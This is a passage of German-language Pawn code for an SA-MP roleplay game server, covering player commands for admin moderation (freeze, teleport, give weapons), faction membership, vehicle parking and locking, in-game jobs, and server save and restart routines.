  		SendClientMessage(playerid,COLOR_YELLOW,"Dein Spawnort wurde geändert: Lake Sorten Motel! Ändere dein Spawnort mit /spawns");
	}else
	{
	    SendClientMessage(playerid,COLOR_RED,"Du bist in keiner Fraktion!");
	}
	return 1;
}
cmd:machemitglied(playerid,params[])
{
    printf("%s machemitglied",PlayerName(playerid));
    new level;
    if(SpielerInfo[playerid][uAdmin] < 3) return KeineRechte(playerid);
    if(sscanf(params,"ri", giveplayerid, level)) return SendClientMessage(playerid,COLOR_RED,"Benutze /machemitglied [Name/ID] [Fraktionen]");
	SpielerInfo[giveplayerid][uMitglied] = level;
	SpielerInfo[giveplayerid][uLeiter] = 0;
	SpielerInfo[giveplayerid][uRang] = 1;
	new string[100];
	format(string,sizeof string,"%s hat dich zum Mitglied der %s gemacht.",PlayerName(playerid),Fraktionen[level]);
	SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
	format(string,sizeof string,"Du hast %s zum Mitglied der %s gemacht.",PlayerName(giveplayerid),Fraktionen[level]);
	SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
	format(string,sizeof string,"userID='%d'",SpielerInfo[giveplayerid][uID]);
	new string2[10];
	format(string2,10,"%d",SpielerInfo[giveplayerid][uMitglied]);
	mysqlupdate("user",string,"Mitglied",string2);
	
	format(string,sizeof string,"userID='%d'",SpielerInfo[giveplayerid][uID]);
	format(string2,10,"%d",SpielerInfo[giveplayerid][uLeiter]);
	mysqlupdate("user",string,"Leiter",string2);
	
	format(string,sizeof string,"userID='%d'",SpielerInfo[giveplayerid][uID]);
	format(string2,10,"%d",SpielerInfo[giveplayerid][uRang]);
	mysqlupdate("user",string,"Rang",string2);
	if(level == 0)
	{
	    SpielerInfo[giveplayerid][uSpawn] = 1;
	    SendClientMessage(giveplayerid,COLOR_YELLOW,"Dein Spawnort wurde geändert: Lake Sorten Motel! Ändere dein Spawnort mit /spawns");
	}
	else
	{
	    SpielerInfo[giveplayerid][uSpawn] = 4;
	    SendClientMessage(giveplayerid,COLOR_YELLOW,"Dein Spawnort wurde geändert: Fraktionsbase! Ändere dein Spawnort mit /spawns");
	}
	
	SpielerInfo[giveplayerid][uArbeitslosengeld] = 0;
    return 1;
}
cmd:unfreeze(playerid,params[])
{
    printf("%s unfreeze",PlayerName(playerid));
    new string[100];
    if(SpielerInfo[playerid][uAdmin] < 2) return KeineRechte(playerid);
    if(sscanf(params,"u", giveplayerid)) return SendClientMessage(playerid,COLOR_RED,"Benutze /freeze [Name/ID]");
    Unfreeze(giveplayerid);
   	format(string,sizeof string,"Du hast %s entgefreezed!",PlayerName(giveplayerid));
	SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
	format(string,sizeof string,"Du wurdest von %s entgefreezed!",PlayerName(playerid));
	SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
    return 1;
}
forward Freezetransport(playerid);
public Freezetransport(playerid)
{
    Unfreeze(playerid);
    return 1;
}
cmd:freeze(playerid,params[])
{
    printf("%s freeze",PlayerName(playerid));
    new string[100];
    if(SpielerInfo[playerid][uAdmin] < 2) return KeineRechte(playerid);
    if(sscanf(params,"u", giveplayerid)) return SendClientMessage(playerid,COLOR_RED,"Benutze /freeze [Name/ID]");
    Freeze(giveplayerid);
   	format(string,sizeof string,"Du hast %s gefreezed!",PlayerName(giveplayerid));
	SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
	format(string,sizeof string,"Du wurdest von %s gefreezed!",PlayerName(playerid));
	SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
    return 1;
}
cmd:down(playerid,params[])
{
    printf("%s down",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 1) return KeineRechte(playerid);
    new Float:X,Float:Y,Float:Z;
    GetPlayerPos(playerid,X,Y,Z);
    Teleport(playerid,X,Y,Z-10);
    return 1;
}
cmd:goto(playerid,params[])
{
    printf("%s goto",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 1) return KeineRechte(playerid);
    if(sscanf(params,"u", giveplayerid)) return SendClientMessage(playerid,COLOR_RED,"Benutze /goto [Name/ID]");
    new Float:X,Float:Y,Float:Z;
    GetPlayerPos(giveplayerid,X,Y,Z);
	Teleport(playerid,X,Y+1,Z+1);
	SetPlayerInterior(playerid,GetPlayerInterior(giveplayerid));
	SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(giveplayerid));
	new string[100];
	format(string,sizeof string,"Du hast dich zu %s teleportiert!",PlayerName(giveplayerid));
	SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
    return 1;
}
cmd:gethere(playerid,params[])
{
    printf("%s gethere",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 1) return KeineRechte(playerid);
    if(sscanf(params,"r", giveplayerid)) return SendClientMessage(playerid,COLOR_RED,"Benutze /gethere [Name/ID]");
    new Float:X,Float:Y,Float:Z;
    GetPlayerPos(playerid,X,Y,Z);
	Teleport(giveplayerid,X,Y+1,Z+1);
	SetPlayerInterior(giveplayerid,GetPlayerInterior(playerid));
	SetPlayerVirtualWorld(giveplayerid,GetPlayerVirtualWorld(playerid));
	new string[100];
	format(string,sizeof string,"Du hast %s zu dir teleportiert!",PlayerName(giveplayerid));
	SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
	format(string,sizeof string,"Du wurdest zu %s teleportiert!",PlayerName(playerid));
	SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
    return 1;
}
cmd:high(playerid,params[])
{
    printf("%s high",PlayerName(playerid));
	new string[80],meter;
    if(SpielerInfo[playerid][uAdmin] < 1) return KeineRechte(playerid);
    if(sscanf(params,"ud", giveplayerid,meter)) return SendClientMessage(playerid,COLOR_RED,"Benutze /high [Name/ID][Meter]");
	new Float:X,Float:Y,Float:Z;
	GetPlayerPos(giveplayerid,X,Y,Z);
	Teleport(giveplayerid,X,Y,Z+meter);
	format(string,sizeof string,"Admin %s hat dich geslapt.",PlayerName(playerid));
	SendClientMessage(giveplayerid,COLOR_LIGHTRED,string);
	format(string,sizeof string,"Du hast %s geslapt.",PlayerName(giveplayerid));
	SendClientMessage(playerid,COLOR_GREEN,string);
    return 1;
}
cmd:adienst(playerid,params[])
{
    printf("%s adienst",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] > 0)
    {
        new name[MAX_PLAYER_NAME],atext[25],str[120],attext[50];
        GetPlayerName(playerid,name,sizeof(name));
        if(SpielerInfo[playerid][uAdmin] == 1){ atext = "{FFFA00}Supporter"; attext = "* Supporter im Dienst *";}
        else if(SpielerInfo[playerid][uAdmin] == 2){ atext = "{FF3C00}Moderator";attext = "* Moderator im Dienst *";}
        else if(SpielerInfo[playerid][uAdmin] == 3){ atext = "{0FC000}Administrator";attext = "* Administrator im Dienst *";}
        else if(SpielerInfo[playerid][uAdmin] == 4){ atext = "{007FFF}Server Manager";attext = "* Server Manager im Dienst *";}
        else if(SpielerInfo[playerid][uAdmin] == 5){ atext = "{AF0000}Projektleiter";attext = "* Projektleiter im Dienst *";}
        if(adienst[playerid] == 0)
        {
	        format(str,sizeof(str),"%s {FAFAFA}%s ist nun im Dienst.",atext,name);
	        GebeLeben(playerid,99999999999999999);
	        SendClientMessageToAll(-1,str);
	        adienst[playerid] = 1;
	        SpielerInfo[playerid][uHunger]=100;
	        SetPlayerChatBubble(playerid, attext, 0xFF0000FF, 100.0, 10000);
	        Admindiensttimer[playerid] = SetTimerEx("AdienstT",2000,true,"d",playerid);
		}
		else{
		    format(str,sizeof(str),"%s {FAFAFA}%s ist nicht mehr im Dienst.",atext,name);
	        SendClientMessageToAll(-1,str);
	        adienst[playerid] = 0;
	        KillTimer(Admindiensttimer[playerid]);
	        GebeLeben(playerid,100);
	        SpielerInfo[playerid][uHunger]=100;
		}
    }else
    {
        KeineRechte(playerid);
    }
	return 1;
}
forward AdienstT(playerid);
public AdienstT(playerid)
{
	new attext[50];
	if(SpielerInfo[playerid][uAdmin] == 1){ attext = "* Supporter im Dienst *";}
    else if(SpielerInfo[playerid][uAdmin] == 2){attext = "* Moderator im Dienst *";}
    else if(SpielerInfo[playerid][uAdmin] == 3){attext = "* Administrator im Dienst *";}
    else if(SpielerInfo[playerid][uAdmin] == 4){attext = "* Server Manager im Dienst *";}
    else if(SpielerInfo[playerid][uAdmin] == 5){attext = "* Projektleiter im Dienst *";}
    SetPlayerChatBubble(playerid, attext, 0xFF0000FF, 100.0, 10000);
	return 1;
}
cmd:autos(playerid,params[])
{
    printf("%s autos",PlayerName(playerid));
	new ctext[60],dtext[60],str[150];
	if(SAuto[playerid][0][sID] == -1)
	{
	    ctext = "Keins Vorhanden";
	}
	else if(SAuto[playerid][0][sID] > 0)
	{
	    format(ctext,sizeof ctext,"%s",AutoDaten[GetVehicleModel(SAuto[playerid][0][sID])-399][AutoName]);
	}
	else if(SAuto[playerid][0][sID] == -2)
	{
	    format(ctext,sizeof ctext,"%s (zertstört)",AutoDaten[SAuto[playerid][0][sModel]-399][AutoName]);
	}
	if(SAuto[playerid][1][sID] == -1)
	{
	    dtext = "Keins Vorhanden";
	}
	else if(SAuto[playerid][1][sID] > 0)
	{
	    format(dtext,sizeof dtext,"%s",AutoDaten[GetVehicleModel(SAuto[playerid][1][sID])-399][AutoName]);
	}
	else if(SAuto[playerid][1][sID] == -2)
	{
	    format(dtext,sizeof dtext,"%s (zertstört)",AutoDaten[SAuto[playerid][1][sModel]-399][AutoName]);
	}
	format(str,sizeof(str),"%s\n%s",ctext,dtext);
	ShowPlayerDialog(playerid,DIALOG_AUTO1,DIALOG_STYLE_LIST,"Auto verwaltung",str,"Anwenden","Abbrechen");
	return 1;
}

cmd:trucker(playerid,params[])
{
	if(PlayerTrucker[playerid] == 0)
	{
		if(SpielerInfo[playerid][uJob] == 5)
		{
		    ShowPlayerDialog(playerid,DIALOG_TRUCKER1,DIALOG_STYLE_LIST,"Truckermenü","Produkte liefern\nTankstelle beliefern","Auswählen","Abbrechen");
		}else SendClientMessage(playerid,COLOR_RED,"Dieser Befehl ist nur für Trucker gedacht!");
	}
	else{SendClientMessage(playerid,COLOR_RED,"Du hast den Job bereits gestartet!");}
	return 1;
}
cmd:abgabe(playerid,params[])
{
    if(SpielerInfo[playerid][uJob] == 6)
	{
	    if(IsPlayerInRangeOfPoint(playerid,10,3046.7622,-8526.3115,4.3970))
	    {
		    if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 478)
		    {
		        new holz = 0, Float:holzgeld;
	            for(new x = 0; x < sizeof(SpielerInventar[]); x++)
				{
		            if(SpielerInventar[playerid][x][0] == 33)
			    	{
						holz = SpielerInventar[playerid][x][1];
						SpielerInventar[playerid][x][0] = -1;
						SpielerInventar[playerid][x][1] = 0;
			        	PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
						PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
					}
				}
				holzgeld = holz * 30.0;
				GebeGeld(playerid,holzgeld);
	            SendFormatMessage(playerid,COLOR_RED,"Danke für das Holz. Du bekommst %.2f$",holzgeld);
			}else SendClientMessage(playerid,COLOR_RED,"Du brauchst ein Holzfällerfahrzeug!");
		}else SendClientMessage(playerid,COLOR_RED,"Hier kannst du kein Holz abgeben!");
	}else SendClientMessage(playerid,COLOR_RED,"Dieser Befehl ist nur für Holzfäller gedacht!");
	return 1;
}
cmd:holzen(playerid,params[])
{
    if(SpielerInfo[playerid][uJob] == 6)
    {
        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 478)
        {
            SendClientMessage(playerid,-1,"{CD0000}Erklärung: {FEFEFE}Es wurde ein Checkpoint zur Baumart gesetzt, diese Baumart ist auf der Map verteilt und kann gefällt werden.");
            SendClientMessage(playerid,COLOR_WHITE,"Anschließend kannst du das Holz /abgabe. Den Abgabeort findest du im Navi unter 'Jobs'!");
			GebeWaffe(playerid,9,1);
			SetPlayerCheckpoint(playerid,4319.0869,-8651.2734,4.3929,2);
		}else SendClientMessage(playerid,COLOR_RED,"Du musst in einem Holzfällerfahrzeug sitzen!");
 	}else SendClientMessage(playerid,COLOR_RED,"Du bist kein Holzfäller");
	return 1;
}
cmd:parken(playerid,params[])
{
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		new vid = GetPlayerVehicleID(playerid);
		if(vid == SAuto[playerid][0][sID])
		{
		    new Float:xx,Float:yy,Float:zz,Float:aa;
		    new nitrox = GetVehicleComponentInSlot(SAuto[playerid][0][sID],CARMODTYPE_NITRO);
			new hydx = GetVehicleComponentInSlot(SAuto[playerid][0][sID],CARMODTYPE_HYDRAULICS);
			new reifx = GetVehicleComponentInSlot(SAuto[playerid][0][sID],CARMODTYPE_WHEELS);
			new Float:vhealth;
			GetVehicleHealth(vid,vhealth);
		    GetVehiclePos(SAuto[playerid][0][sID],xx,yy,zz);
		    GetVehicleZAngle(SAuto[playerid][0][sID],aa);
		    SAuto[playerid][0][sX] = xx;
		    SAuto[playerid][0][sY] = yy;
		    SAuto[playerid][0][sZ] = zz;
		    SAuto[playerid][0][sA] = aa;
		    SendClientMessage(playerid,COLOR_GREEN,"Du hast dein Fahrzeug erfolgreich geparkt!");
			Tuningladen(playerid,0);
			AddVehicleComponent(SAuto[playerid][0][sID], nitrox);
			AddVehicleComponent(SAuto[playerid][0][sID], hydx);
			AddVehicleComponent(SAuto[playerid][0][sID], reifx);
			SetVehicleHealth(vid,vhealth);
		}
		else if(vid == SAuto[playerid][1][sID])
		{
		    new nitrox = GetVehicleComponentInSlot(SAuto[playerid][1][sID],CARMODTYPE_NITRO);
			new hydx = GetVehicleComponentInSlot(SAuto[playerid][1][sID],CARMODTYPE_HYDRAULICS);
			new reifx = GetVehicleComponentInSlot(SAuto[playerid][1][sID],CARMODTYPE_WHEELS);
	 		new Float:xx,Float:yy,Float:zz,Float:aa;
	 		new Float:vhealth;
			GetVehicleHealth(vid,vhealth);
		    GetVehiclePos(SAuto[playerid][1][sID],xx,yy,zz);
		    GetVehicleZAngle(SAuto[playerid][1][sID],aa);
		    SAuto[playerid][1][sX] = xx;
		    SAuto[playerid][1][sY] = yy;
		    SAuto[playerid][1][sZ] = zz;
		    SAuto[playerid][1][sA] = aa;
		    SendClientMessage(playerid,COLOR_GREEN,"Du hast dein Fahrzeug erfolgreich geparkt!");
			Tuningladen(playerid,1);
			AddVehicleComponent(SAuto[playerid][1][sID], nitrox);
			AddVehicleComponent(SAuto[playerid][1][sID], hydx);
			AddVehicleComponent(SAuto[playerid][1][sID], reifx);
			SetVehicleHealth(vid,vhealth);
		}
		else{SendClientMessage(playerid,COLOR_RED,"Du sitzt nicht in deinem Fahrzeug!");}
	}
    else{SendClientMessage(playerid,COLOR_RED,"Als Beifahrer ist dies nicht möglich!");}
	return 1;
}
cmd:lock(playerid,params[])
{
    printf("%s lock",PlayerName(playerid));
    new Float:xx,Float:yy,Float:zz,Float:xx1,Float:yy1,Float:zz1,str1[40];
	GetVehiclePos(SAuto[playerid][0][sID],xx,yy,zz);
	GetVehiclePos(SAuto[playerid][1][sID],xx1,yy1,zz1);
	new engine, lights, alarm, doors, bonnet, boot, objective;
	if(IsPlayerInRangeOfPoint(playerid,3,xx,yy,zz))
	{
	    GetVehicleParamsEx(SAuto[playerid][0][sID], engine, lights, alarm, doors, bonnet, boot, objective);
	    if(doors == VEHICLE_PARAMS_ON || doors == -1)
		{
  			SetVehicleParamsEx(SAuto[playerid][0][sID], engine, lights, alarm, VEHICLE_PARAMS_OFF, bonnet, boot, objective);
		    for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,GetPlayerVehicleID(playerid)))
		    {
		        PlayerTextDrawSetString(i, TachoText[i][15], "~g~aufgeschlossen");
		    }
			format(str1,sizeof(str1),"%s aufgeschlossen",AutoDaten[SAuto[playerid][0][sModel]-399][AutoName]);
			SendClientMessage(playerid,COLOR_GREEN,str1);
		}
		else
		{
  			SetVehicleParamsEx(SAuto[playerid][0][sID], engine, lights, alarm, VEHICLE_PARAMS_ON, bonnet, boot, objective);
		    for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,GetPlayerVehicleID(playerid)))
		    {
		        PlayerTextDrawSetString(i, TachoText[i][15], "~r~abgeschlossen");
		    }
			format(str1,sizeof(str1),"%s abgeschlossen",AutoDaten[SAuto[playerid][0][sModel]-399][AutoName]);
			SendClientMessage(playerid,COLOR_RED,str1);
		}
	}
	else if(IsPlayerInRangeOfPoint(playerid,3,xx1,yy1,zz1))
	{
	    GetVehicleParamsEx(SAuto[playerid][1][sID], engine, lights, alarm, doors, bonnet, boot, objective);
	    if(doors == VEHICLE_PARAMS_ON || doors == -1)
		{
  			SetVehicleParamsEx(SAuto[playerid][1][sID], engine, lights, alarm, VEHICLE_PARAMS_OFF, bonnet, boot, objective);
		    for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,GetPlayerVehicleID(playerid)))
		    {
		        PlayerTextDrawSetString(i, TachoText[i][15], "~g~aufgeschlossen");
		    }
			format(str1,sizeof(str1),"%s aufgeschlossen",AutoDaten[SAuto[playerid][1][sModel]-399][AutoName]);
			SendClientMessage(playerid,COLOR_GREEN,str1);
		}
		else
		{
  			SetVehicleParamsEx(SAuto[playerid][1][sID], engine, lights, alarm, VEHICLE_PARAMS_ON, bonnet, boot, objective);
		    for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,GetPlayerVehicleID(playerid)))
		    {
		        PlayerTextDrawSetString(i, TachoText[i][15], "~r~abgeschlossen");
		    }
			format(str1,sizeof(str1),"%s abgeschlossen",AutoDaten[SAuto[playerid][1][sModel]-399][AutoName]);
			SendClientMessage(playerid,COLOR_RED,str1);
		}
	}
	else{SendClientMessage(playerid,COLOR_RED,"Es ist kein Fahrzeug in deiner Nähe!");}
	return 1;
}
cmd:teleport(playerid,params[])
{
    printf("%s teleport",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 1) return KeineRechte(playerid);
	ShowPlayerDialog(playerid,DIALOG_ADMINPORT,DIALOG_STYLE_LIST,"Wohin willst du dich teleportieren?","LS Police Department\nLS Motel\nLS BSN\nLS Ballas\nTailcenter\nLS Villbeach\nPortland\nWrong Hill\nFarm 1 Kreuzung\nFarm 2 LS-LV\nLV Feuerwehr\nLV-SF Brücke Holzhaus\nLV-SF Bootssteg\nSF Police Department\nSF Motel\nArmy Base\nTrucker\nFlughafen\nYakuza\nFlugzeugträger\nHotel","Teleport","Abbrechen");
    return 1;
}
cmd:jetpack(playerid,params[])
{
	printf("%s jetpack",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 4) return KeineRechte(playerid);
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USEJETPACK);
	return 1;
}
cmd:aruf(playerid,params[])
{
    printf("%s aruf",PlayerName(playerid));
    new txt[84],str[128];
    if(SpielerInfo[playerid][uAdmin] < 1) return KeineRechte(playerid);
    if(sscanf(params,"s[84]",txt))return SendClientMessage(playerid,0xE2220AFF,"Benutze: /aruf <Text>");
    format(str,sizeof(str),"[TEAM]: %s: %s",PlayerName(playerid),txt);
    SendClientMessageToAll(0xFFF000FF,str);
    return 1;
}
cmd:rruf(playerid,params[])
{
    printf("%s aruf",PlayerName(playerid));
    new txt[84],str[128];
    if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
    if(sscanf(params,"s[84]",txt))return SendClientMessage(playerid,0xE2220AFF,"Benutze: /rruf <Text>");
    format(str,sizeof(str),"[Staat-NEWS]: %s: %s",PlayerName(playerid),txt);
    SendClientMessageToAll(0x00358CFF,str);
    return 1;
}
cmd:fraktionen(playerid,params[])
{
    printf("%s fraktionen",PlayerName(playerid));
	new string[250];
	format(string,sizeof string,"Zur Zeit gibt es folgende Fraktionen:");
	SendClientMessage(playerid,COLOR_GREEN,string);
	format(string,sizeof string," ");
	for(new x = 0; x < sizeof(Fraktionen); x++)
	{
	    format(string,sizeof string,"[%d] %s",x,Fraktionen[x]);
	    SendClientMessage(playerid,COLOR_GREEN,string);
	}
	return 1;
}
cmd:rauswerfen(playerid,params[])
{
    printf("%s rauswerfen",PlayerName(playerid));
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,COLOR_RED,"Du bist nicht Fahrer eines Fahrzeuges!");
	if(sscanf(params,"r",giveplayerid)) return SendClientMessage(playerid,COLOR_RED,"Benutze /rauswerfen [Name/ID]");
	if(GetPlayerVehicleID(giveplayerid) != GetPlayerVehicleID(playerid)) return SendClientMessage(playerid,COLOR_RED,"Der Spieler befindet sich nicht in deinem Fahrzeug!");
	RemovePlayerFromVehicle(giveplayerid);
	SendClientMessage(giveplayerid,COLOR_RED,"Du wurdest aus dem Fahrzeug geworfen!");
	SendClientMessage(playerid,COLOR_GREEN,"Spieler aus dem Fahrzeug geworfen!");
	Unfreeze(giveplayerid);
	return 1;
}
cmd:admins(playerid,params[])
{
    printf("%s admins",PlayerName(playerid));
	SendClientMessage(playerid,COLOR_ORANGE,"Admins online:");
	new string[70],atext[60];
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uEingeloggt] == 1 && SpielerInfo[i][uAdmin] > 0)
 		{
 	 		if(SpielerInfo[i][uAdmin] == 1){ atext = "{FFFA00}Supporter";}
        	else if(SpielerInfo[i][uAdmin] == 2){ atext = "{FF3C00}Moderator";}
        	else if(SpielerInfo[i][uAdmin] == 3){ atext = "{0FC000}Administrator";}
        	else if(SpielerInfo[i][uAdmin] == 4){ atext = "{007FFF}Server Manager";}
        	else if(SpielerInfo[i][uAdmin] == 5){ atext = "{AF0000}Projektleiter";}
        	format(string,sizeof string,"%s %s (%d)",atext,PlayerName(i),SpielerInfo[i][uAdmin]);
 	 		SendClientMessage(playerid,-1,string);
 		}
 	}
	return 1;
}
cmd:abbrechen(playerid,params[])
{
    printf("%s abbrechen",PlayerName(playerid));
	if(FahrschulPruef[playerid] > 0)
	{
	    SendClientMessage(playerid,COLOR_GREEN,"Theorieprüfung abgebrochen!");
		FahrschulPruef[playerid] = -1;
		PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][0]);
	  	PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][1]);
	   	PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][2]);
	   	PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][3]);
	   	PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][4]);
		PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][5]);
		FahrschulPruef_Fehler[playerid] = 0;
		TogglePlayerControllable(playerid,true);
		CancelSelectTextDraw(playerid);

	}
	if(Fahrpruefung[playerid] > 0)
	{
	    Fahrpruefung[playerid] = 0;
	    SendClientMessage(playerid,COLOR_GREEN,"Fahrprüfung abgebrochen!");
	}
	return 1;
}
cmd:leader(playerid,params[])
{
    printf("%s leader",PlayerName(playerid));
	SendClientMessage(playerid,COLOR_ORANGE,"Leader online:");
	new string[30];
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uEingeloggt] == 1 && SpielerInfo[i][uLeiter] > 0)
 		{
 	 		format(string,sizeof string,"%s - %s",Fraktionen[SpielerInfo[i][uLeiter]],PlayerName(i));
 	 		SendClientMessage(playerid,COLOR_ORANGE,string);
 		}
 	}
	return 1;
}
cmd:serverexit(playerid,params[])
{
    printf("%s exit",PlayerName(playerid));
	new str[150];
	if(SpielerInfo[playerid][uAdmin] < 5) return KeineRechte(playerid);
    SetTimer("Speicherfunktion",15000,0);
    SetTimer("stopfunktion",20000,0);
    format(str,sizeof(str),"Administrator %s macht den Server aus! Server stoppt in 20 Sekunden!",PlayerName(playerid));
    SendClientMessageToAll(COLOR_LIGHTBLUE,str);
	return 1;
}
cmd:restart(playerid,params[])
{
    printf("%s restart",PlayerName(playerid));
	new str[150];
	if(SpielerInfo[playerid][uAdmin] < 4) return KeineRechte(playerid);
    SetTimer("Speicherfunktion",5000,0);
    SetTimer("Restartserver",10000,0);
    format(str,sizeof(str),"Administrator %s restartet den Server! Restart in 10 Sekunden!",PlayerName(playerid));
    SendClientMessageToAll(COLOR_LIGHTBLUE,str);
	return 1;
}
cmd:speichern(playerid,params[])
{
    printf("%s speichern",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 4) return KeineRechte(playerid);
 	SetTimer("Speicherfunktion",1000,0);
	SendClientMessage(playerid,COLOR_LIGHTBLUE,"Alle Daten wurden gespeichert!");
	return 1;
}
forward stopfunktion();
public stopfunktion()
{
	//SendRconCommand("unloadfs CIMap");
    SendRconCommand("exit");
	return 1;
}
forward Restartserver();
public Restartserver()
{
	//SendRconCommand("unloadfs CIMap");
    SendRconCommand("gmx");
	return 1;
}
forward Speicherfunktion();
public Speicherfunktion()
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uEingeloggt] == 1)
	    {
	    	AccountSpeichern(i);
	    }
	}
	Blitzerspeichern();
	fraklagerspeichern();
	Frakrangspeichern();
	return 1;
}
forward Werbungreset(playerid);
public Werbungreset(playerid)
{
    Werbungschreiben = 0;
    SendClientMessageToAll(0x00BB00FF,"Es kann nun eine neue Werbung geschrieben werden!");
    new str[140];
	format(str,sizeof(str),"Hier koennte Ihre Werbung stehen!");
	TextDrawSetString(UserBr[10],str);
	SetDynamicObjectMaterialText(Werbeschild1,0, str, 120, "Gabriola", 85, 0, 0xFFFFFFFF, 0xFF0E316D, 1);
	return 1;
}
cmd:spawn(playerid,params[])
{
    printf("%s spawn",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 1) return KeineRechte(playerid);
    if(sscanf(params,"r", giveplayerid)) return SendClientMessage(playerid,COLOR_RED,"Benutze /spawn [Name/ID]");
	Freeze(giveplayerid); SetTimerEx("Unfreeze",3000,0,"d",giveplayerid);
    //Teleport(giveplayerid,1826.6150,-9282.8447,4.4203);
    PlayerSpawnOnPoint(giveplayerid);
    SendClientMessage(giveplayerid,COLOR_GREEN,"Du wurdest gespawnt!");
    SendClientMessage(playerid,COLOR_GREEN,"Spieler respawnt!");
    return 1;
}
cmd:getcar(playerid,params[])
{
    printf("%s getcar",PlayerName(playerid));
	new vehicleid,Float:X,Float:Y,Float:Z;
	if(SpielerInfo[playerid][uAdmin] < 2) return KeineRechte(playerid);
	if(sscanf(params,"d",vehicleid)) return SendClientMessage(playerid,COLOR_RED,"Benutze: /getcar [vehicleid]");
	GetPlayerPos(playerid, X, Y, Z);
	SetVehiclePos(vehicleid, X, Y+2, Z);
	return 1;
}
cmd:gotocar(playerid,params[])
{
    printf("%s gotocar",PlayerName(playerid));
	new vehicleid,Float:X,Float:Y,Float:Z;
	if(SpielerInfo[playerid][uAdmin] < 2) return KeineRechte(playerid);
	if(sscanf(params,"d",vehicleid)) return SendClientMessage(playerid,COLOR_RED,"Benutze: /gotocar [vehicleid]");
	GetVehiclePos(vehicleid, X, Y, Z);
	Teleport(playerid, X, Y+2, Z+1);
	return 1;
}
cmd:nos(playerid,params[])
{
    printf("%s nos",PlayerName(playerid));
 	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,COLOR_RED,"Du bist in keinem Fahrzeug!");
 	if(SpielerInfo[playerid][uAdmin] < 2) return KeineRechte(playerid);
 	new component = GetVehicleComponentInSlot(GetPlayerVehicleID(playerid), CARMODTYPE_NITRO);
	if(component != 1010) AddVehicleComponent(GetPlayerVehicleID(playerid), 1010);
	SendClientMessage(playerid, COLOR_RED, "Erfolgreich 10x Nitro eingebaut.");
	return 1;
}
/*cmd:auto(playerid,params[])
{
    printf("%s auto",PlayerName(playerid));
	if(SpielerInfo[playerid][uAdmin] < 2) return KeineRechte(playerid);
	new veh[20],vehicleid,color1,color2,Float:X,Float:Y,Float:Z,carid;
	if(sscanf(params,"s[20]", veh)) return SendClientMessage(playerid,COLOR_RED,"Benutze /auto [Name]");
	sscanf(params,"s[20]dd", veh, color1, color2);
	for(new v = 0; v < sizeof(AutoDaten); v++)
	{
	    if(strfind(AutoDaten[v][AutoName],veh, true) == 0)
		{
		    vehicleid = 399+v;
		    break;
		}
	}
	GetPlayerPos(playerid,X,Y,Z);
	carid = CreateVehicle(vehicleid,X,Y,Z,-1,color1,color2,-1 );
	SaveCoords(carid);
	Meter[carid]=0;
	Meter2[carid]=0;
	Benzin[carid] = AutoDaten[GetVehicleModel(carid)-399][MaxBenzin];
	SetVehicleNumberPlate(carid,"GESPAWNT");
	SetVehicleToRespawn(carid);
	new engine, lights, alarm, doors, bonnet, boot, objective;
	GetVehicleParamsEx(carid, engine, lights, alarm, doors, bonnet, boot, objective);
	SetVehicleParamsEx(carid, engine, lights, alarm, VEHICLE_PARAMS_OFF, bonnet, boot, objective);
	Motorschaden2[carid] = 0;
	return 1;
}*/
cmd:gebewaffe(playerid,params[])
{
    printf("%s gebewaffe",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 3) return KeineRechte(playerid);
    new waffe,muni;
    if(sscanf(params,"rii", giveplayerid,waffe,muni)) return SendClientMessage(playerid,COLOR_RED,"Benutze /gebewaffe [Name/ID] [Waffe] [Munition]");
	GebeWaffe(giveplayerid,waffe,muni);
    return 1;
}
cmd:skins(playerid,params[])
{
    printf("%s skins",PlayerName(playerid));
